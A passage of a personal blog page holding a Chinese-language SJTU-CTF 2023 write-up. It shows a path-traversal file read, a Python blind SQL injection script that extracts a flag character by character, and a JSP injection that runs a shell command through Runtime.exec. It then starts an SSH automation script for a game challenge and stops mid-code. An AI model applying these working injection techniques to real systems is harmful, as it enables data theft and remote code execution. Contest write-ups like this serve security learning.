<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"szy0127.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="SJTU-CTF 2023 Writeup[TOC] WEBflag galleryF12看网络 可以看到请求了getflag.php?flag&#x3D;尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限http:&#x2F;&#x2F;cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080&#x2F;getflag.php?flag&#x3D;">
<meta property="og:type" content="article">
<meta property="og:title" content="SJTU-CTF 2023 Writeup">
<meta property="og:url" content="http://szy0127.github.io/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/index.html">
<meta property="og:site_name" content="S blog">
<meta property="og:description" content="SJTU-CTF 2023 Writeup[TOC] WEBflag galleryF12看网络 可以看到请求了getflag.php?flag&#x3D;尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限http:&#x2F;&#x2F;cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080&#x2F;getflag.php?flag&#x3D;">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-01-22T12:48:28.640Z">
<meta property="article:modified_time" content="2024-01-22T12:49:52.899Z">
<meta property="article:author" content="szy">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://szy0127.github.io/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://szy0127.github.io/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/","path":"2024/01/22/ctf/SJTU-CTF 2023 Writeup/","title":"SJTU-CTF 2023 Writeup"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SJTU-CTF 2023 Writeup | S blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">S blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SJTU-CTF-2023-Writeup"><span class="nav-number">1.</span> <span class="nav-text">SJTU-CTF 2023 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag-gallery"><span class="nav-number">1.1.1.</span> <span class="nav-text">flag gallery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimic-SQL"><span class="nav-number">1.1.2.</span> <span class="nav-text">Mimic SQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezjsp"><span class="nav-number">1.1.3.</span> <span class="nav-text">ezjsp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RPG1"><span class="nav-number">1.2.1.</span> <span class="nav-text">简单的RPG1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RPG2"><span class="nav-number">1.2.2.</span> <span class="nav-text">简单的RPG2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RPG3"><span class="nav-number">1.2.3.</span> <span class="nav-text">简单的RPG3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RPG4"><span class="nav-number">1.2.4.</span> <span class="nav-text">简单的RPG4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RPG5"><span class="nav-number">1.2.5.</span> <span class="nav-text">简单的RPG5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RPG6"><span class="nav-number">1.2.6.</span> <span class="nav-text">简单的RPG6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REVERSE"><span class="nav-number">1.3.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyMBA"><span class="nav-number">1.3.1.</span> <span class="nav-text">EasyMBA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">1.4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Baby-RSA"><span class="nav-number">1.4.1.</span> <span class="nav-text">Baby RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSFL"><span class="nav-number">1.4.2.</span> <span class="nav-text">RSFL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.5.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Baby-Equation"><span class="nav-number">1.5.1.</span> <span class="nav-text">Baby Equation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tiny-ELF"><span class="nav-number">1.5.2.</span> <span class="nav-text">Tiny ELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Teensy-ELF"><span class="nav-number">1.5.3.</span> <span class="nav-text">Teensy ELF</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">szy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="SJTU-CTF 2023 Writeup | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SJTU-CTF 2023 Writeup
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:48:28 / Modified: 20:49:52" itemprop="dateCreated datePublished" datetime="2024-01-22T20:48:28+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>3.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>14 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="SJTU-CTF-2023-Writeup"><a href="#SJTU-CTF-2023-Writeup" class="headerlink" title="SJTU-CTF 2023 Writeup"></a>SJTU-CTF 2023 Writeup</h1><p>[TOC]</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="flag-gallery"><a href="#flag-gallery" class="headerlink" title="flag gallery"></a>flag gallery</h3><p>F12看网络 可以看到请求了getflag.php?flag&#x3D;<br>尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限<br><a target="_blank" rel="noopener" href="http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php">http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php</a><br>可以看到给了密码的md5哈希 最早以为这个没法碰撞，想别的思路了 比如提权 后来发现可以直接用<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> 找到密码是sjtuctf</p>
<h3 id="Mimic-SQL"><a href="#Mimic-SQL" class="headerlink" title="Mimic SQL"></a>Mimic SQL</h3><p><code>select * from article where id=(select id from flag where flag like &#39;0%&#39;)</code> 可以根据查询到结果与否逐个爆破flag的每个字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0ops&#123;65BDC40EC5FF286E2E0B3C71BF3247D8&#125;</span></span><br><span class="line">base = <span class="string">&quot;http://8d5affacfc024519894c9d2345f17bdf.penguin.0ops.sjtu.cn:8080/article?id=&quot;</span></span><br><span class="line"></span><br><span class="line">flag_c = <span class="string">&#x27;0ops&#123;&#x27;</span></span><br><span class="line">real_flag = flag_c</span><br><span class="line">flag = flag_c</span><br><span class="line">find = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> find:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(c) <span class="keyword">in</span> <span class="string">&#x27;_%&#x27;</span>:</span><br><span class="line">            flag = flag_c + <span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>]&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = flag_c + <span class="built_in">chr</span>(c)</span><br><span class="line">        </span><br><span class="line">        query = <span class="string">f&quot;(select id from flag where flag like &#x27;<span class="subst">&#123;flag&#125;</span>%&#x27;)&quot;</span></span><br><span class="line">        <span class="comment">#print(query)</span></span><br><span class="line">        res = requests.get(base+urllib.parse.quote(query))</span><br><span class="line">        <span class="keyword">if</span> check(res.text):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                find = <span class="literal">True</span></span><br><span class="line">            flag_c = flag</span><br><span class="line">            real_flag = flag_c + <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(flag_c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(real_flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ezjsp"><a href="#ezjsp" class="headerlink" title="ezjsp"></a>ezjsp</h3><p>刚开始以为嵌入代码的标签都被过滤了 只能用el表达式 参考了这篇文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43147039/article/details/116885802">一次jsp上传绕过的思考 –yzddMr6_yzddMr6的博客-CSDN博客</a><br>尝试用[‘’]绕过. 用反射代替new等<br>后来偶然发现竟然可以直接用&lt;%%&gt;注入java代码 不会被过滤 .也不会</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    out.println(Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag &gt; /usr/local/tomcat/webapps/ROOT/upload/flag.txt&quot;</span>&#125;).waitFor());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/227181.htm#_lab2_1_2">调用java.lang.Runtime.exec的正确姿势分享_java_脚本之家 (jb51.net)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/dingding_ting/article/details/121215718">Process.waitFor()方法的返回值_永远不要矫情的博客-CSDN博客</a><br>返回0表示执行成功，然后用url读返回的地址即可拿到flag</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="简单的RPG1"><a href="#简单的RPG1" class="headerlink" title="简单的RPG1"></a>简单的RPG1</h3><p>简单模拟 异或可以反推</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">stage1key=[<span class="number">157</span>, <span class="number">212</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">249</span>, <span class="number">234</span>, <span class="number">171</span>, <span class="number">226</span>, <span class="number">140</span>, <span class="number">204</span>, <span class="number">135</span>, <span class="number">167</span>, <span class="number">241</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">26</span>, <span class="number">77</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">118</span>, <span class="number">118</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">10</span>, <span class="number">60</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">0</span></span><br><span class="line">choice = []</span><br><span class="line"><span class="keyword">while</span> status &lt; <span class="built_in">len</span>(stage1key):</span><br><span class="line">    choice.append((status*<span class="number">9</span>)^<span class="number">0x86</span>^stage1key[status])</span><br><span class="line">    status += <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">status = 0</span></span><br><span class="line"><span class="string">while status &lt; len(stage1key):</span></span><br><span class="line"><span class="string">    print(choice[status]^(status*9)^0x86,stage1key[status])</span></span><br><span class="line"><span class="string">    status += 1</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for c in choice:</span></span><br><span class="line"><span class="string">    print(chr(c))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&#x27;0ops&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">        flag = data[data.find(<span class="string">&#x27;0ops&#x27;</span>):]</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line"></span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">n = <span class="number">102400</span></span><br><span class="line">ssh.connect(<span class="string">&#x27;111.186.57.85&#x27;</span>,<span class="number">40150</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">s = ssh.invoke_shell(width=<span class="number">181</span>,height=<span class="number">58</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">begin</span>():</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    b()</span><br><span class="line">    <span class="comment">#print(dir(s))</span></span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b()</span><br><span class="line">        <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(&#x27;menu&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage1</span>():</span><br><span class="line">    s.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;play stage 1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> choice:</span><br><span class="line">        s.send(c.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag1 = data[data.find(<span class="string">&#x27;0ops&#x27;</span>):]</span><br><span class="line">    <span class="built_in">print</span>(flag1)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin()</span></span><br><span class="line"><span class="comment">#stage1()</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./direction.txt&#x27;</span>)</span><br><span class="line">direction = f.read().split(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">direction = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> direction]</span><br><span class="line"><span class="built_in">print</span>(direction)</span><br><span class="line"><span class="comment">#print(direction)</span></span><br><span class="line"><span class="comment">#direction = [0 for i in range(10)]</span></span><br><span class="line"><span class="comment">#f = open(&#x27;direction.pkl&#x27;,&#x27;rb&#x27;)</span></span><br><span class="line"><span class="comment">#direction = pickle.load(f)</span></span><br><span class="line"><span class="comment">#print(direction)</span></span><br><span class="line">n2d = &#123;<span class="number">0</span>:<span class="string">&#x27;w&#x27;</span>,<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>:<span class="string">&#x27;s&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isCorrect</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data.find(<span class="string">&#x27;路口&#x27;</span>)!=-<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage2</span>():</span><br><span class="line">    </span><br><span class="line">    s.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line">    <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(&#x27;play stage 2&#x27;)</span></span><br><span class="line">    s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    b()</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span 